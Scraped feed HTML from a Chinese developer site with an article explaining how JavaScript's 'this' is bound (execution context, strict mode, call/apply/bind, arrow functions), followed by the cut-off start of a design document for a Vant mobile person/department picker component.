itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解JavaScript 中 this 的底层设计：从执行上下文到调用机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578786070367529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tzarevich
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T11:19:10.000Z" title="Thu Dec 04 2025 11:19:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">JavaScript 中 <code>this</code> 的底层设计：从执行上下文到调用机制</h2>
<p>在 JavaScript 语言中，<code>this</code> 是一个独特而关键的概念。它既不是变量，也不遵循作用域规则；它不依赖函数定义的位置，却完全由<strong>函数如何被调用</strong>决定。这种“动态绑定”机制使 <code>this</code> 成为 JavaScript 执行模型中最灵活也最容易误解的部分。本文将从 <strong>编译与执行机制、执行上下文结构、历史设计背景、绑定规则分类</strong> 四个层面，深入剖析 <code>this</code> 的底层原理。</p>
<hr/>
<h3 data-id="heading-1">一、自由变量 vs <code>this</code>：静态作用域与动态绑定的对立</h3>
<p>JavaScript 的执行过程分为两个阶段：<strong>编译阶段（Compilation）</strong> 和 <strong>执行阶段（Execution）</strong> 。</p>
<h4 data-id="heading-2">1. 自由变量的查找：词法作用域（Lexical Scope）</h4>
<ul>
<li>在编译阶段，引擎通过词法分析构建 <strong>作用域链（Scope Chain）</strong> 。</li>
<li>当函数内部引用一个未声明的变量（自由变量），引擎会沿着作用域链向上查找。</li>
<li>这个过程是<strong>静态的</strong>——只取决于函数<strong>定义的位置</strong>，与调用方式无关。</li>
</ul>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">let</span> site = <span class="hljs-string">'time.geekbang.com'</span>;

<span class="hljs-function">function <span class="hljs-title">getSite</span>()</span> {
    <span class="hljs-keyword">return</span> site; <span class="hljs-comment">// 编译时就确定：从外层作用域找 site</span>
}
</code></pre>
<blockquote>
<p>✅ 变量查找是“看定义”，而 <code>this</code> 是“看调用”。</p>
</blockquote>
<h4 data-id="heading-3">2. <code>this</code> 的例外性：运行时动态绑定</h4>
<ul>
<li><code>this</code> 不属于词法环境，也不参与作用域链查找。</li>
<li>它的值在<strong>函数被调用的那一刻</strong>才确定，由<strong>调用方式</strong>决定。</li>
<li>这使得 <code>this</code> 成为 JavaScript 执行上下文中<strong>唯一动态字段</strong>。</li>
</ul>
<blockquote>
<p>🔥 <strong>核心区别</strong>：</p>
<ul>
<li>变量：编译阶段 → 静态 → 作用域链</li>
<li><code>this</code>：执行阶段 → 动态 → 调用上下文</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-4">二、为什么要设计 <code>this</code>？—— 无类时代的 OOP 支撑</h3>
<p>JavaScript 最初没有 <code>class</code>（直到 ES6 才引入），但开发者仍需要面向对象的能力：<strong>让方法能操作所属对象的数据</strong>。</p>
<p>设想没有 <code>this</code> 的场景：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">user</span> = { name: <span class="hljs-string">'极客时间'</span> }<span class="hljs-comment">;</span>
function getName(obj) {
    return obj.name<span class="hljs-comment">;</span>
}
getName(user)<span class="hljs-comment">; // 必须显式传参，不符合“方法属于对象”的直觉</span>
</code></pre>
<p>有了 <code>this</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript">user.<span class="hljs-property">getName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>; <span class="hljs-comment">// 自动知道“我是谁的方法”</span>
};
user.<span class="hljs-title function_">getName</span>(); <span class="hljs-comment">// '极客时间'</span>
</code></pre>
<blockquote>
<p>✅ <strong><code>this</code> 的设计初衷</strong>：<br/>
在无类、基于原型的语言中，提供一种机制，让<strong>同一个函数可以作为多个对象的方法复用</strong>，并自动访问调用者的数据。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">三、“不好的设计”？—— 全局 <code>this</code> 与严格模式的救赎</h3>
<p>尽管 <code>this</code> 有其价值，但 JavaScript 的早期实现确实存在一个<strong>饱受诟病的设计</strong>：</p>
<blockquote>
<p><strong>当函数作为普通函数调用时（如 <code>fn()</code>），<code>this</code> 默认指向全局对象（浏览器中是 <code>window</code>）。</strong></p>
</blockquote>
<h4 data-id="heading-6">问题根源</h4>
<ul>
<li>Brendan Eich 在 10 天内设计 JS 时，为简化实现，让 <code>this</code> “总有值”。</li>
<li>结合 <code>var</code> 声明会挂载到 <code>window</code> 的特性，极易造成<strong>全局污染</strong>：</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">name</span> = <span class="hljs-string">'Global'</span><span class="hljs-comment">;</span>
function resetName() {
    <span class="hljs-attr">this.name</span> = <span class="hljs-string">'Hacked'</span><span class="hljs-comment">; // 意外修改 window.name！</span>
}
resetName()<span class="hljs-comment">;</span>
console.log(window.name)<span class="hljs-comment">; // 'Hacked'</span>
</code></pre>
<h4 data-id="heading-7">严格模式的修正</h4>
<p>ES5 引入的严格模式（<code>'use strict'</code>）解决了这一问题：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-meta">'use strict'</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">resetName</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'Hacked'</span>; <span class="hljs-comment">// TypeError: Cannot set property 'name' of undefined</span>
}
<span class="hljs-title function_">resetName</span>(); <span class="hljs-comment">// this = undefined → 直接报错</span>
</code></pre>
<blockquote>
<p>✅ <strong>严格模式的意义</strong>：<br/>
让无意义的 <code>this</code> 绑定显式失败，避免静默错误，提升代码健壮性。</p>
</blockquote>
<hr/>
<h3 data-id="heading-8">四、从执行上下文看 <code>this</code></h3>
<p>要真正理解 <code>this</code> 的行为，我们必须深入 JavaScript 引擎的运行机制——执行上下文（Execution Context）。每当一个函数被调用时，JS 引擎会为其创建一个独立的执行上下文，这个上下文就像一个“运行沙盒”，包含了函数执行所需的一切信息。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f5989a07c16477bb50f74788d862332~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVHphcmV2aWNo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765451950&amp;x-signature=iFDcAPYp4Rg4pDlHbxHVorTOzQ4%3D" alt="this.png" loading="lazy"/></p>
<p>这张图清晰地展示了函数执行上下文的四个核心组成部分：<strong>变量环境</strong>、<strong>词法环境</strong>、<strong>outer（外层环境引用）</strong> 和 <strong>this</strong>。其中，前三者在函数定义时就已基本确定，并共同支撑了 JavaScript 的词法作用域和闭包机制；而 <strong><code>this</code> 是唯一一个在函数调用时才被动态赋值的字段</strong>，它不参与作用域链的查找，也不依赖函数定义的位置。</p>
<p>正是这种设计，使得 <code>this</code> 成为 JavaScript 执行模型中的“例外”——它的值完全由<strong>调用方式</strong>决定，而非编译阶段的静态结构。这也解释了为什么同一个函数在不同调用场景下，<code>this</code> 会指向完全不同的对象。</p>
<p>通过执行上下文的视角，我们就能明白：<code>this</code> 并非“神秘指针”，而是引擎在创建执行上下文时，根据调用规则填入的一个运行时绑定值。</p>
<hr/>
<h3 data-id="heading-9">五、<code>this</code> 指向的五种核心情况</h3>
<p>根据 ECMAScript 规范，<code>this</code> 的绑定遵循以下优先级（从高到低）：</p>
<h4 data-id="heading-10">1. <strong>new 绑定</strong>（构造函数调用）</h4>
<pre><code class="hljs language-ini" lang="ini">function Site(name) {
    <span class="hljs-attr">this.name</span> = name<span class="hljs-comment">; // this → 新创建的实例</span>
}
const <span class="hljs-attr">site</span> = new Site(<span class="hljs-string">'time.geekbang.com'</span>)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>引擎自动创建对象、链接原型、绑定 <code>this</code>、返回实例。</li>
</ul>
<h4 data-id="heading-11">2. <strong>显式绑定</strong>（<code>.call</code> / <code>.apply</code> / <code>.bind</code>）</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span>.<span class="hljs-title function_ invoke__">call</span>(obj, a, b);     <span class="hljs-comment">// 立即执行，this = obj</span>
<span class="hljs-keyword">const</span> bound = <span class="hljs-keyword">fn</span>.<span class="hljs-title function_ invoke__">bind</span>(obj); <span class="hljs-comment">// 返回永久绑定 this 的新函数</span>
</code></pre>
<h4 data-id="heading-12">3. <strong>隐式绑定</strong>（对象方法调用）</h4>
<pre><code class="hljs language-scss" lang="scss">obj<span class="hljs-selector-class">.method</span>(); <span class="hljs-comment">// this = obj</span>
</code></pre>
<ul>
<li>
<p>⚠️ 注意“绑定丢失”：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">fn</span> = obj.method<span class="hljs-comment">;</span>
fn()<span class="hljs-comment">; // this → 全局 / undefined</span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-13">4. <strong>默认绑定</strong>（普通函数调用）</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">fn</span>(<span class="hljs-params"/>)</span>; <span class="hljs-comment">// 非严格 → window；严格 → undefined</span>
</code></pre>
<h4 data-id="heading-14">5. <strong>箭头函数</strong>（无自己的 <code>this</code>）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'outer'</span>,
    <span class="hljs-attr">fn</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>) <span class="hljs-comment">// this 继承外层作用域</span>
};
</code></pre>
<ul>
<li>箭头函数没有 <code>ThisBinding</code>，<code>this</code> 在<strong>定义时</strong>捕获，不受调用影响。</li>
</ul>
<hr/>
<h3 data-id="heading-15">六、特殊场景：事件处理函数中的 <code>this</code></h3>
<p>在 DOM 事件中，浏览器会自动绑定 <code>this</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript">button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// this = button 元素</span>
});
</code></pre>
<ul>
<li>若使用箭头函数，则 <code>this</code> 指向外层作用域（通常不是元素）。</li>
</ul>
<hr/>
<h3 data-id="heading-16">七、总结：理解 <code>this</code> 的正确姿势</h3>





























<table><thead><tr><th>关键认知</th><th>说明</th></tr></thead><tbody><tr><td><strong><code>this</code> 不是作用域概念</strong></td><td>它属于执行上下文，与变量查找无关</td></tr><tr><td><strong><code>this</code> 由调用方式决定</strong></td><td>与函数定义位置无关</td></tr><tr><td><strong>设计初衷是支持 OOP</strong></td><td>在无 class 时代实现方法复用</td></tr><tr><td><strong>全局 <code>this</code> 是历史包袱</strong></td><td>严格模式已有效规避</td></tr><tr><td><strong>掌握四种绑定规则</strong></td><td>new &gt; 显式 &gt; 隐式 &gt; 默认</td></tr></tbody></table>
<blockquote>
<p>💬 <strong>记住这句口诀</strong>：<br/>
<strong>“变量看定义，this 看调用；<br/>
方法属谁家，点号说了算！”</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-17">结语</h3>
<p><code>this</code> 并非 JavaScript 的“缺陷”，而是其<strong>多范式融合</strong>（函数式 + 基于原型的 OOP）的必然产物。它的动态性带来了复杂性，但也赋予了语言强大的表达能力。理解 <code>this</code> 的底层机制，不仅能避免常见错误，更能让你写出更高效、更安全的代码。</p>
<p>当你下次看到 <code>this</code> 时，请不要把它当作“神秘指针”，而要思考： <strong>“此刻，是谁在调用这个函数？”</strong> —— 答案，就是 <code>this</code>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于Vant的移动端公共选人/选部门组件设计文档]]></title>    <link>https://juejin.cn/post/7579813945600819240</link>    <guid>https://juejin.cn/post/7579813945600819240</guid>    <pubDate>2025-12-04T11:36:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579813945600819240" data-draft-id="7579410911057903642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于Vant的移动端公共选人/选部门组件设计文档"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-04T11:36:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱吃香菜i"/> <meta itemprop="url" content="https://juejin.cn/user/712936594609816"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于Vant的移动端公共选人/选部门组件设计文档
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712936594609816/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱吃香菜i
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T11:36:23.000Z" title="Thu Dec 04 2025 11:36:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    23
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">基于Vant的移动端公共选人/选部门组件设计文档</h2>
<h3 data-id="heading-1">1. 组件概述</h3>
<h4 data-id="heading-2">1.1 组件名称</h4>
<p><code>SelectPersonDeptMobile</code> - 基于Vant的移动端公共选人/选部门组件</p>
<h4 data-id="heading-3">1.2 组件功能</h4>
<ul>
<li>支持选择用户、角色、组织架构、群组、快速查找</li>
<li>支持多选/单选模式（通过multiple布尔值控制）</li>
<li>支持搜索功能</li>
<li>支持平铺列表展示，通过下级按钮加载新数据</li>
<li>支持已选人员/部门展示与管理</li>
<li>移动端友好的交互设计</li>
<li>基于Vant组件库实现</li>
<li>支持自定义选择类型</li>
</ul>
<h4 data-id="heading-4">1.3 设计理念</h4>
<ul>
<li>模块化设计，便于复用</li>
<li>基于Vant组件库，保证移动端体验一致性</li>
<li>支持灵活配置，适应不同业务场景</li>
<li>类型安全，使用TypeScript确保类型正确</li>
<li>良好的用户体验，流畅的交互效果</li>
<li>轻量级设计，性能优化</li>
<li>纯UI组件设计，与数据逻辑分离</li>
</ul>
<h3 data-id="heading-5">2. 组件结构设计</h3>
<h4 data-id="heading-6">2.1 目录结构</h4>
<pre><code class="hljs language-bash" lang="bash">components/
└── SelectPersonDeptMobile/
    ├── SelectPersonDeptMobile.vue    <span class="hljs-comment"># 主组件</span>
    ├── SelectPersonDept.types.ts     <span class="hljs-comment"># 类型定义文件</span>
    ├── components/                   <span class="hljs-comment"># 子组件</span>
    │   ├── SearchBar.vue             <span class="hljs-comment"># 搜索栏组件（基于Vant Search）</span>
    │   ├── TabNav.vue                <span class="hljs-comment"># 标签导航组件（基于Vant Tabs）</span>
    │   ├── SelectList.vue            <span class="hljs-comment"># 平铺列表组件（基于Vant List/Cell）</span>
    │   └── SelectedList.vue          <span class="hljs-comment"># 已选列表组件（基于Vant Tag/Cell）</span>
    └── utils/                        <span class="hljs-comment"># 工具函数</span>
        └── helper.ts                 <span class="hljs-comment"># 辅助函数</span>
</code></pre>
<h3 data-id="heading-7">3. 类型定义</h3>
<h4 data-id="heading-8">3.1 基础类型</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// SelectPersonDept.types.ts</span>

<span class="hljs-comment">// 选择项类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SelectPersonDeptProps</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> = 'user' | 'role' | 'dept' | 'group' | 'quick_search'&gt; {
  tabs?: <span class="hljs-title class_">Array</span>&lt;{
    <span class="hljs-attr">tab</span>: T;
    <span class="hljs-attr">tab_name</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-attr">uniKey</span>: <span class="hljs-built_in">string</span>;
    [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
  }&gt;;
  <span class="hljs-comment">// 其他props保持不变</span>
}

<span class="hljs-comment">// 标签配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TabConfig</span> {
  <span class="hljs-attr">tab</span>: <span class="hljs-title class_">SelectItemType</span>;
  <span class="hljs-attr">tab_name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">interface</span>?: <span class="hljs-built_in">string</span>; // 可选，标签页对应的数据接口标识
  [key: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

// 用户信息
export <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserInfo</span> {
  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">userName</span>: <span class="hljs-built_in">string</span>;
  deptName?: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">userCode</span>: <span class="hljs-built_in">string</span>;
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-comment">// 部门信息</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DeptInfo</span> {
  <span class="hljs-attr">deptId</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">deptName</span>: <span class="hljs-built_in">string</span>;
  parentId?: <span class="hljs-built_in">string</span>;
  hasChildren?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// 是否有下级数据</span>
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-comment">// 角色信息</span>
